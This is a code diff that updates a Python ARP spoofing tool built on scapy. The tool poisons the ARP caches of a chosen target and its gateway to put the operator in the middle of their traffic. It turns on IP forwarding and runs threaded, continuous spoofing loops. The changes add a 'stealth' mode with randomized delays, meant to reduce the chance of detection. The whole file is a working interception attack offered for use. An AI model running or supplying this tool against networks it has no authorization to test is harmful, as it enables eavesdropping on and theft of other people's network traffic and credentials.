@@ -1,18 +1,28 @@
 #!/usr/bin/env python3
 
-import time
 import sys
-import datetime as dt
-import requests
+import time
+import random
+import logging
+import threading
 import subprocess
+
+from utilities.vendor import VendorLookup
 from argparse import ArgumentParser
 import scapy.all as scapy
+from colorama import Fore, Style, init
 
 if sys.version_info < (3, 0):
     sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
     sys.stderr.write(
         "Please update and make sure you use the command python3 arp_spoof.py -t <target_ip> -g <gateway_ip>\n\n")
     sys.exit(0)
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+vendor_lookup = VendorLookup(json_file_path="assets/mac-vendors-export.json")
+init(autoreset=True)
 
 
 def args():
@@ -21,6 +31,8 @@ def args():
                                                                       "Example: --target 192.168.1.7")
     parser.add_argument("-g", "--gateway", dest="gateway_address",
                         help="Specify the IP address of the gateway to spoof. Example: --gateway 192.168.1.1")
+    parser.add_argument("-s", "--stealth", dest="stealth_mode", action="store_true",
+                        help="Enable stealth mode to reduce detection likelihood.")
     options = parser.parse_args()
     if not options.target_address:
         parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
@@ -29,73 +41,144 @@ def args():
     return options
 
 
-def fetch_mac_address(ip_address, timeout=7):
-    arp_request = scapy.ARP(pdst=ip_address)  # create an ARP request
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast an ARP packets to all devices in the network
-    broadcast_arp_packets = broadcast / arp_request  # combining these 2 packets together to send
+def fetch_mac_address(ip_address, timeout=2, retries=3):
+    for _ in range(retries):
+        try:
+            arp_request = scapy.ARP(op="who-has", pdst=ip_address)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            broadcast_arp_packets = broadcast / arp_request
 
-    answered, unanswered = scapy.srp(broadcast_arp_packets, timeout=timeout,
-                                     verbose=False)  # send packets to all devices
+            answered, unanswered = scapy.srp(broadcast_arp_packets, timeout=timeout, verbose=False, retry=10)
 
-    # extracting information from answered packets
-    devices_mac_list = []
-    for sent_packet, received_packet in answered:
-        # check if the packet contains an ARP layer
-        if scapy.ARP in received_packet:
-            device_info = {"mac": received_packet[scapy.Ether].src}
-            devices_mac_list.append(device_info)
+            devices_mac_list = []
+            for sent_packet, received_packet in answered:
+                if scapy.ARP in received_packet:
+                    device_info = {"mac": received_packet[scapy.Ether].src}
+                    devices_mac_list.append(device_info)
 
-    return devices_mac_list
-
-
-def fetch_mac_vendor(ip_address):
-    return \
-        requests.get(url="https://www.macvendorlookup.com/api/v2/" + fetch_mac_address(ip_address=ip_address)[0]["mac"],
-                     timeout=7).json()[0]["company"]
+            if devices_mac_list:
+                return devices_mac_list
+        except Exception as e:
+            logging.error(f"Error fetching MAC address for {ip_address}: {e}")
+            time.sleep(1)
+    return []
 
 
-def spoof(target_ip, spoof_ip):
-    target_mac_address = fetch_mac_address(ip_address=target_ip)[0]["mac"]
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
-                             psrc=spoof_ip)  # op=2 telling scapy to send ARP response, pdst=<target_ip>,
-    # hwdst=<target_mac>, psrc=<gateway_ip> (false information)
-    scapy.send(arp_response, verbose=False)
+def spoof(target_ip, spoof_ip, stealth_mode=False):
+    try:
+        target_mac_address = fetch_mac_address(ip_address=target_ip)[0]["mac"]
+        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
+        scapy.send(arp_response, verbose=False)
+        if stealth_mode:
+            time.sleep(random.uniform(0.3, 1.0))  # randomized delay for stealth mode
+    except Exception as e:
+        logging.error(f"Error spoofing {target_ip}: {e}")
 
 
 def restore(destination_ip, source_ip):
-    destination_mac_address = fetch_mac_address(ip_address=destination_ip)[0]["mac"]
-    source_mac_address = fetch_mac_address(ip_address=source_ip)[0]["mac"]
-    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
-                             hwsrc=source_mac_address)
-    scapy.send(arp_response, verbose=False, count=4)  # count=4 sent this packet 4 times
+    try:
+        destination_mac_address = fetch_mac_address(ip_address=destination_ip)[0]["mac"]
+        source_mac_address = fetch_mac_address(ip_address=source_ip)[0]["mac"]
+        arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
+                                 hwsrc=source_mac_address)
+        scapy.send(arp_response, verbose=False, count=4)
+    except Exception as e:
+        logging.error(f"Error restoring ARP table for {destination_ip}: {e}")
+
+
+def spoof_target(target_ip, gateway_ip, stealth_mode):
+    while True:
+        spoof(target_ip=target_ip, spoof_ip=gateway_ip, stealth_mode=stealth_mode)
+        time.sleep(random.uniform(1.5, 2.0))
+
+
+def spoof_gateway(target_ip, gateway_ip, stealth_mode):
+    while True:
+        spoof(target_ip=gateway_ip, spoof_ip=target_ip, stealth_mode=stealth_mode)
+        time.sleep(random.uniform(1.5, 2.0))
+
+
+def print_banner():
+    print(Fore.CYAN + Style.BRIGHT + """
+     █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗
+    ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
+    ███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗  
+    ██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  
+    ██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║     
+    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     
+        Github: https://github.com/SaherMuhamed/arp-spoofing-mitm
+    """ + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "\t\t  By Saher Muhamed - version 2.1.1" + Style.RESET_ALL)
+    print(Fore.YELLOW + Style.BRIGHT + "──────────────────────────────────────────────────────────────────────────" + Style.RESET_ALL)
+
+
+def print_side_by_side(target_ip, target_mac, target_vendor, gateway_ip, gateway_mac, gateway_vendor):
+    target_info = (
+        f"{Fore.GREEN}[+] Target Information:{Style.RESET_ALL}\n"
+        f"    IP Address: {target_ip}\n"
+        f"    MAC Address: {target_mac}\n"
+        f"    Vendor: {target_vendor}"
+    )
+    gateway_info = (
+        f"{Fore.BLUE}[+] Gateway Information:{Style.RESET_ALL}\n"
+        f"    IP Address: {gateway_ip}\n"
+        f"    MAC Address: {gateway_mac}\n"
+        f"    Vendor: {gateway_vendor}"
+    )
+
+    # splitting strings into lines
+    target_lines = target_info.split('\n')
+    gateway_lines = gateway_info.split('\n')
+
+    max_lines = max(len(target_lines), len(gateway_lines))
+    for i in range(max_lines):
+        target_line = target_lines[i] if i < len(target_lines) else ""
+        gateway_line = gateway_lines[i] if i < len(gateway_lines) else ""
+        print(f"{target_line.ljust(40)} {gateway_line}")
 
 
 option = args()
 target_ip_address = option.target_address
 gateway_ip_address = option.gateway_address
+stealth_mode = option.stealth_mode
 
+print_banner()
 packets_counter = 0
 try:
-    client_response = fetch_mac_vendor(ip_address=target_ip_address)
-    router_response = fetch_mac_vendor(ip_address=gateway_ip_address)
-    print("\n" + str(dt.datetime.now().strftime("%b %d, %Y %H:%M:%S %p")))
-    print("===========================================")
-    print("* Target Device " + target_ip_address + " (" + client_response + ")")
-    print("* Target Router " + gateway_ip_address + " (" + router_response + ")")
-    print("===========================================")
-    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
-                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
-    print("[+] Successful enabled IP forwarding..")
+    target_mac = fetch_mac_address(ip_address=target_ip_address)[0]["mac"]
+    gateway_mac = fetch_mac_address(ip_address=gateway_ip_address)[0]["mac"]
+    target_vendor = vendor_lookup.get_vendor(target_mac)
+    gateway_vendor = vendor_lookup.get_vendor(gateway_mac)
+
+    print_side_by_side(
+        target_ip=target_ip_address,
+        target_mac=target_mac,
+        target_vendor=target_vendor,
+        gateway_ip=gateway_ip_address,
+        gateway_mac=gateway_mac,
+        gateway_vendor=gateway_vendor
+    )
+
+    print(Fore.CYAN + "\n[+] Enabling IP Forwarding..." + Style.RESET_ALL)
+    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    print(Fore.CYAN + "[+] IP Forwarding Enabled" + Style.RESET_ALL)
+
+    # start spoofing threads
+    target_thread = threading.Thread(target=spoof_target, args=(target_ip_address, gateway_ip_address, stealth_mode))
+    gateway_thread = threading.Thread(target=spoof_gateway, args=(target_ip_address, gateway_ip_address, stealth_mode))
+    target_thread.daemon = True
+    gateway_thread.daemon = True
+    target_thread.start()
+    gateway_thread.start()
+
+    print(Fore.MAGENTA + "\n[+] ARP Spoofing Started. Press Ctrl+C to stop" + Style.RESET_ALL)
     while True:
-        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)  # first packet goes to the client
-        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)  # second packet goes to the router
         packets_counter += 2
-        print("\r[+] Sent " + str(packets_counter) + " ARP Spoofed Packets.", end='')
+        print(Fore.YELLOW + f"\r[+] Sent {packets_counter} ARP Spoofed Packets", end='', flush=True)
         time.sleep(1.7)
 except KeyboardInterrupt:
-    print("\n===========================================")
-    print("[*] Detected 'ctrl + c' pressed, program terminated.")
-    print("[*] Cleaning up and re-arping targets...\n")
+    print(Fore.RED + "\n\n[!] Detected 'Ctrl + C'. Terminating..." + Style.RESET_ALL)
+    print(Fore.RED + "[!] Cleaning up and restoring ARP tables..." + Style.RESET_ALL)
     for _ in range(3):
         restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
+    print(Fore.RED + "[!] ARP tables restored. Exiting" + Style.RESET_ALL)
     sys.exit(0)
